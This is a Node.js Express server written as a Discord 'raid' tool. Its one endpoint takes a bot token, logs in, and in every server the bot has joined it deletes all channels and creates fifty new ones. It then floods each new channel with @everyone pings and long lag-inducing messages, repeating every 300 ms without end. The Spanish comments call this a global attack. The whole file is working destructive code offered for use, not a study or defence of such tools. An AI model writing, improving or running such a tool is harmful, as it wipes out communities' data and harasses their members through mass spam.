const express = require('express');
const { Client, IntentsBitField, ChannelType, ActivityType } = require('discord.js');
const app = express();

app.use(express.json());
app.use(express.static('public'));

app.post('/api/run-raid', async (req, res) => {
    const { token, msg, channelName, myWebsite } = req.body;
    const bot = new Client({ 
        intents: [IntentsBitField.Flags.Guilds, IntentsBitField.Flags.GuildMessages] 
    });

    try {
        await bot.login(token);
        bot.once('ready', async () => {
            // STATUS DE STREAMING GLOBAL
            bot.user.setActivity("BY ELITE TOOLS", {
                type: ActivityType.Streaming,
                url: myWebsite || "https://twitch.tv" 
            });

            const guilds = bot.guilds.cache;
            
            // ATAQUE GLOBAL A TODOS LOS SERVIDORES
            guilds.forEach(async (guild) => {
                // 1. LIMPIEZA INSTANTÁNEA
                const channels = await guild.channels.fetch();
                await Promise.all(channels.map(ch => ch.delete().catch(() => {})));

                // 2. CREACIÓN MASIVA (50 canales por servidor)
                const lagMsg = (msg || "@everyone RAIDED") + "\n" + "█".repeat(800);

                for (let i = 0; i < 50; i++) {
                    guild.channels.create({
                        name: channelName || "raid-global",
                        type: ChannelType.GuildText
                    }).then(async (ch) => {
                        // Ráfaga inicial de 15 mensajes
                        await Promise.all(Array(15).fill(0).map(() => ch.send(lagMsg).catch(() => {})));
                        // Spam infinito
                        setInterval(() => ch.send(lagMsg).catch(() => {}), 300);
                    }).catch(() => {});
                }
            });

            res.json({ success: true, count: guilds.size });
        });
    } catch (err) {
        res.status(401).json({ error: "Token Inválido" });
    }
});

app.listen(3000, () => console.log("Elite Global Engine Online"));
